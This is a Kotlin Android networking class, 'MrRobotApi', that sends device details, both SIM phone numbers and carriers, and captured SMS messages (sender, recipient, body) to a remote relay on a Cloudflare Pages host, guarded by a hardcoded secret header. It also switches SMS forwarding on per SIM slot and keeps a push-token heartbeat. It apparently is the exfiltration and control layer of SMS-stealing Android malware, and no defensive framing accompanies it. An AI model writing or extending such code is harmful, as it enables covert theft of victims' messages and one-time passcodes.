package com.example.admin.network

  import android.content.Context
  import android.util.Log
  import kotlinx.coroutines.Dispatchers
  import kotlinx.coroutines.suspendCancellableCoroutine
  import kotlinx.coroutines.withContext
  import okhttp3.Call
  import okhttp3.Callback
  import okhttp3.MediaType.Companion.toMediaType
  import okhttp3.OkHttpClient
  import okhttp3.Request
  import okhttp3.RequestBody.Companion.toRequestBody
  import okhttp3.Response
  import org.json.JSONObject
  import java.io.IOException
  import java.util.concurrent.TimeUnit
  import kotlin.coroutines.resume

  data class UpsertResult(val success: Boolean, val response: String?)

  class MrRobotApi(private val context: Context) {

      companion object {
          private const val TAG = "MrRobotApi"

          // ── Cloudflare Pages proxy relay URL ──────────────────────────────
          const val API_BASE_URL = "https://proxy-6tq.pages.dev/api/relay"
          const val APP_ID       = "APP-9I5G-1KS9-RBYU"

          // ── Secret header — proxy rejects any request without this ────────
          private const val APP_SECRET  = "MRR-X9F3-2026-SECRET"
          private const val SECRET_HDR  = "x-app-secret"

          private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
      }

      private val baseUrl = API_BASE_URL.trim()

      private val client = OkHttpClient.Builder()
          .connectTimeout(30, TimeUnit.SECONDS)
          .readTimeout(30, TimeUnit.SECONDS)
          .writeTimeout(30, TimeUnit.SECONDS)
          .build()

      fun getAppId(): String = APP_ID
      fun getApiBaseUrl(): String = baseUrl

      // ── POST /relay/register ──────────────────────────────────────────────
      fun registerDevice(uid: String, deviceJson: JSONObject, callback: (Boolean, String?) -> Unit) {
          val body = JSONObject().apply {
              put("appId",          APP_ID)
              put("deviceId",       uid)
              put("name",           deviceJson.optString("model", "Unknown"))
              put("androidVersion", deviceJson.optInt("androidversion", 0))
              put("sim1Carrier",    deviceJson.optString("sim1carrier", ""))
              put("sim1Phone",      deviceJson.optString("sim1number", ""))
              put("sim2Carrier",    deviceJson.optString("sim2carrier", ""))
              put("sim2Phone",      deviceJson.optString("sim2number", ""))
          }
          postJson("$baseUrl/register", body, callback)
      }

      // ── POST /relay/heartbeat (FCM token update) ──────────────────────────
      fun updateDeviceToken(uid: String, token: String, callback: (Boolean, String?) -> Unit) {
          val body = JSONObject().apply {
              put("deviceId", uid)
              put("fcmToken", token)
          }
          postJson("$baseUrl/heartbeat", body, callback)
      }

      // ── POST /relay/heartbeat (suspend, coroutine) ────────────────────────
      suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult =
          withContext(Dispatchers.IO) {
              suspendCancellableCoroutine { cont ->
                  val body = JSONObject().apply {
                      put("deviceId",   uid)
                      put("lastOnline", "0s ago")
                  }
                  val request = Request.Builder()
                      .url("$baseUrl/heartbeat")
                      .addHeader(SECRET_HDR, APP_SECRET)
                      .post(body.toString().toRequestBody(JSON_MEDIA))
                      .build()
                  val call = client.newCall(request)
                  cont.invokeOnCancellation { call.cancel() }
                  call.enqueue(object : Callback {
                      override fun onFailure(call: Call, e: IOException) {
                          Log.e(TAG, "upsertHeartbeat failed: ${e.message}")
                          if (cont.isActive) cont.resume(UpsertResult(false, e.message))
                      }
                      override fun onResponse(call: Call, response: Response) {
                          val s = response.body?.string() ?: ""
                          if (cont.isActive) cont.resume(UpsertResult(response.isSuccessful, s))
                      }
                  })
              }
          }

      // ── PATCH /relay/devices/:uid ─────────────────────────────────────────
      fun updateForwardStatus(
          uid: String,
          enabled: Boolean,
          simSlot: Int,
          callback: (Boolean, String?) -> Unit
      ) {
          val body = JSONObject().apply {
              put("forwardEnabled", enabled)
              put("forwardSlot",    simSlot)
          }
          val request = Request.Builder()
              .url("$baseUrl/devices/$uid")
              .addHeader(SECRET_HDR, APP_SECRET)
              .method("PATCH", body.toString().toRequestBody(JSON_MEDIA))
              .build()

          client.newCall(request).enqueue(object : Callback {
              override fun onFailure(call: Call, e: IOException) {
                  Log.e(TAG, "updateForwardStatus failed: ${e.message}")
                  callback(false, e.message)
              }
              override fun onResponse(call: Call, response: Response) {
                  val s = response.body?.string() ?: ""
                  if (response.isSuccessful) {
                      Log.d(TAG, "updateForwardStatus ok → enabled=$enabled slot=$simSlot")
                      callback(true, s)
                  } else {
                      Log.e(TAG, "updateForwardStatus error ${response.code}: $s")
                      callback(false, s)
                  }
              }
          })
      }

      // ── POST /relay/messages ──────────────────────────────────────────────
      fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
          val uid    = smsData.optString("uid", "")
          val userId = "USR-${uid.takeLast(6).uppercase()}"

          val sender   = smsData.optString("phone_number", "UNKNOWN")
          val receiver = smsData.optString("receiver_number", "")
          val toNumber = if (receiver.isBlank() || receiver.equals("UNKNOWN", ignoreCase = true)) null else receiver

          val body = JSONObject().apply {
              put("appId",       APP_ID)
              put("deviceId",    uid)
              put("userId",      userId)
              put("fromSender",  sender)
              put("fromNumber",  sender)
              if (toNumber != null) put("toNumber", toNumber)
              put("body",        smsData.optString("message_body", ""))
              put("isSensitive", false)
          }
          postJson("$baseUrl/messages", body, callback)
      }

      // ── POST /relay/data ──────────────────────────────────────────────────
      fun sendData(payload: JSONObject, callback: (Boolean, String?) -> Unit) {
          postJson("$baseUrl/data", payload, callback)
      }

      // ── Internal: POST with secret header on every call ───────────────────
      private fun postJson(url: String, body: JSONObject, callback: (Boolean, String?) -> Unit) {
          val request = Request.Builder()
              .url(url)
              .addHeader(SECRET_HDR, APP_SECRET)
              .post(body.toString().toRequestBody(JSON_MEDIA))
              .build()
          client.newCall(request).enqueue(object : Callback {
              override fun onFailure(call: Call, e: IOException) {
                  Log.e(TAG, "POST $url failed: ${e.message}")
                  callback(false, e.message)
              }
              override fun onResponse(call: Call, response: Response) {
                  val s = response.body?.string() ?: ""
                  if (response.isSuccessful) callback(true, s)
                  else { Log.e(TAG, "POST $url error ${response.code}: $s"); callback(false, s) }
              }
          })
      }
  }
  